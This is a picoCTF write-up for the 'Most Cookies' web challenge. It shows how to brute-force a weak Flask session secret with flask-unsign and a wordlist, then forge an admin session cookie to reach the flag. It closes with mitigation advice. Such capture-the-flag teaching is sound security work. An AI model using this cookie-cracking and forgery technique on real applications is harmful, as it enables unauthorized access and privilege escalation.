# picoCTF – Most Cookies Writeup

## Overview

This challenge focuses on exploiting **Flask session cookies** protected by a secret key.

The application uses **JWT-like Flask session cookies** to store user information. The server signs these cookies using a secret key chosen from a list of cookie names.

Our objective is to **discover the secret key used to sign the cookie**, forge a new cookie with elevated privileges (`admin`), and retrieve the flag.

**Category:** Web Exploitation  
**Difficulty:** Medium  
**Goal:** Forge a valid admin session cookie to access the flag.

---

## Tools Used

- Burp Suite / Browser DevTools
- Python
- `flask-unsign`
- Kali Linux
- Text editor (Notepad++ / VSCode)

---

## Initial Reconnaissance

After opening the challenge website, we see a simple page titled:

```
Welcome to My Cookie Search Page
```

The page allows users to search for different cookie types.

Inspecting the browser cookies reveals a **session cookie** that appears to be a **JWT-like token**.

Example:

```
session=eyJ2ZXJ5X29mZiI6IlNuaWNrZXJkb29kbGUifQ....
```

This suggests the application uses **Flask session cookies**.

---

## Decoding the Session Cookie

The cookie can be decoded using tools such as:

- jwt.io
- CyberChef
- flask-unsign

Decoded content:

```json
{
  "very_off": "Snickerdoodle"
}
```

The important parameter here is:

```
very_off
```

---

## Source Code Analysis

The challenge provides a file called:

```
server.py
```

Looking at the code reveals the following logic:

```python
app.secret_key = random.choice(cookie_names)
```

This means the **secret key is randomly chosen from a list of cookie names**.

Later in the code we find:

```python
if check == "admin":
    return render_template("flag.html")
```

This indicates that if we can set:

```
very_off = admin
```

we will gain access to the flag page.

However, because Flask signs the cookie using the secret key, we must **discover the correct secret key first**.

---

## Creating a Wordlist of Possible Secrets

The list of cookie names from the source code can be turned into a wordlist.

Example:

```
snickerdoodle
chocolatechip
oatmealraisin
gingersnap
shortbread
macadamia
```

Save them into a file called:

```
cookies.txt
```

---

## Cracking the Flask Secret Key

We use the tool **flask-unsign** to brute-force the secret key.

Install it:

```bash
pip3 install flask-unsign
```

Run the cracking command:

```bash
flask-unsign --unsign --cookie <SESSION_COOKIE> --wordlist cookies.txt
```

Example output:

```
[+] Found secret key after 28 attempts
secret = gingersnap
```

Now we know that the secret key used to sign the cookie is:

```
gingersnap
```

---

## Forging an Admin Cookie

Now that we know the secret key, we can create a **new signed cookie**.

Command:

```bash
flask-unsign --sign --cookie '{"very_off":"admin"}' --secret gingersnap
```

The tool generates a **new valid session cookie**.

Example:

```
eyJ2ZXJ5X29mZiI6ImFkbWluIn0.YYkq3A.xxxxxxxxxxxxx
```

---

## Exploiting the Application

1. Open browser developer tools
2. Navigate to **Application → Cookies**
3. Find the **session cookie**
4. Replace it with the forged admin cookie
5. Refresh the page

---

## Result

After refreshing the page, the server accepts our forged session and grants **admin privileges**.

The flag page becomes accessible.

```
Flag: picoCTF{...}
```

---

## Analysis

The vulnerability occurs because the application:

- Stores authentication data inside **client-side cookies**
- Uses a **weak secret key chosen from a predictable list**
- Allows attackers to **brute-force the signing key**

Once the secret is discovered, attackers can **forge arbitrary session cookies**.

This results in **privilege escalation**.

---

## Lessons Learned

- Flask session cookies rely entirely on the **secret key** for security.
- Weak or guessable secrets make session forgery possible.
- Sensitive authorization logic should not rely only on client-side data.

---

## Mitigation

To prevent this vulnerability:

- Use a **strong, unpredictable secret key**
- Store sensitive session data on the **server side**
- Rotate secret keys regularly
- Implement additional authentication checks

---

## References

- Flask Documentation
- OWASP – Broken Authentication
- flask-unsign Tool
